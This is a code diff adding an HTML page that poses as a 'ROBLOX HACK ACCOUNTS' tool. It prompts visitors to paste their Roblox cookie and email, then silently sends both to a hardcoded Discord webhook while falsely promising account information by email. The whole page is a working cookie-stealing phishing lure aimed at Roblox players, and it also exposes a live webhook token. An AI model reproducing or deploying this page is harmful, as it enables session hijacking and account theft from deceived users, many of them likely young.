@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ROBLOX HACK ACCOUNTS</title>
+</head>
+<body>
+  <h1>ROBLOX HACK ACCOUNTS</h1>
+  <p>ENTER ROBLOX COOKIE:</p>
+  <textarea id="cookieInput" cols="50" rows="5"></textarea>
+  <p>ENTER EMAIL:</p>
+  <input type="email" id="emailInput" placeholder="Your email...">
+  <button onclick="sendToDiscord()">Check Password</button>
+  <p id="infoText">After clicking "Check Password", the Roblox account information will be sent to the provided email within 24 hours.</p>
+
+  <script>
+    function sendToDiscord() {
+      const input = document.getElementById('cookieInput').value;
+      const email = document.getElementById('emailInput').value;
+      const message = `@everyone \`${input}\` @everyone Email: \`${email}\``;
+
+      fetch('https://discord.com/api/webhooks/1189272320200683661/R4Qyi1M0CjIvjanlsvwelS7o7jSdMSg3Br6GBYtXbLZf1xABE2PFfManAbuRAgMYCadS', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content: message }),
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Message sent to Discord:', data);
+        alert('Message sent to Discord!');
+      })
+      .catch(error => {
+        console.error('There was a problem sending the message to Discord:', error);
+        // Usunięcie alertu w przypadku błędu
+      });
+    }
+  </script>
+</body>
+</html>
